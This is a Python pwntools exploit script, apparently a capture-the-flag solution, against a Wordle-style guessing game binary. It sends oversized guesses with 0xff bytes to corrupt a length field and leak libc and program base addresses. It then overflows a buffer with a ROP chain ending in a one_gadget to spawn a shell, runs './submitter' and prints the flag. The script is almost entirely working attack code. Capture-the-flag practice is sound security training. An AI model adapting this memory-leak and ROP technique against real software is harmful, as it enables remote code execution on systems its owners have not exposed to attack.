import argparse

from pwn import *

context.terminal = ["tmux", "splitw", "-v"]
context.log_level = "debug"
context.arch = "amd64"


PATH = "/handout/challenge"
LIBC = "/handout/libc.so.6"
LD = "/handout/ld-linux-x86-64.so.2"
# e = ELF(PATH)
# libc = ELF(LIBC)

network = len(sys.argv) > 1

if network:
    parser = argparse.ArgumentParser()
    default_addr = (
        os.environ.get("HOST", "127.0.0.1") + ":" + os.environ.get("PORT", "31337")
    )
    parser.add_argument("--network", action="store_true")
    parser.add_argument(
        "address", default=default_addr, nargs="?", help="Address of challenge"
    )
    args = parser.parse_args()
    HOST, PORT = args.address.split(":")

    r = remote(HOST, int(PORT))
else:
    r = process(PATH)
#    r = gdb.debug(PATH, f'''
# file {PATH}
# break *main+0x253
# c
# c
# c
# c
#''')

r.sendlineafter(b"How long will the solution word be?\n", b"10")
r.sendlineafter(b"How many guesses does the player get?\n", b"7")

r.sendlineafter(
    b"What is your guess #1?\n", b"aaaaaaaaa\xff"
)  # set guess[2] length to ff
bigname = b"\xff" * (0x6C)
bigname += b"\xfe"

r.sendlineafter(b"What is your guess #2?\n", bigname)

stuff = r.recvuntil(b"What is your guess #3?\n")
stuff = stuff.replace(b" \x1b[1;30;42m ", b"")
stuff = stuff.replace(b" \x1b[1;30;43m ", b"")
stuff = stuff.replace(b" \x1b[0m ", b"")

libc_base = u64(stuff[0xAC : 0xAC + 8]) - (0x7F25636B3D90 - 0x7F256368A000)
img_base = u64(stuff[0xBC : 0xBC + 8]) - (0x55CD4545D3C7 - 0x000055CD4545C000)
# stack = u64(stuff[0xac:0xb4])

print(f"libc base is {libc_base:#x}")
print(f"img base is {img_base:#x}")
# print(f"stack is {stack:#x}")

print(stuff)

bigname2 = b"\x00" * (0x62)
bigname2 += b"\x81"
bigname2 += b"".join(
    p64(c)
    for c in [
        libc_base + 0x0012593E,  # pop rbp ; retn
        libc_base + 0x21A2C0,  # rbp
        libc_base + 0x0011F2E7,  # pop rdx ; pop r12 ; retn
        0,  # rdx
        0,  # r12
        libc_base + 0xEBC85,  # one_gadget
    ]
)
bigname2 += b"1000000020000000300000004"

bigname2 = bigname2 + (b"\xaa" * (255 - 31 - len(bigname2)))

r.sendline(bigname2)

time.sleep(2)

r.recvuntil(b"You win!")
r.sendline()
time.sleep(1)

r.sendline(b"./submitter")
r.recvuntil(b"Flag: ")
print(r.recvuntil(b"\n").decode(), end="")


# r.interactive()
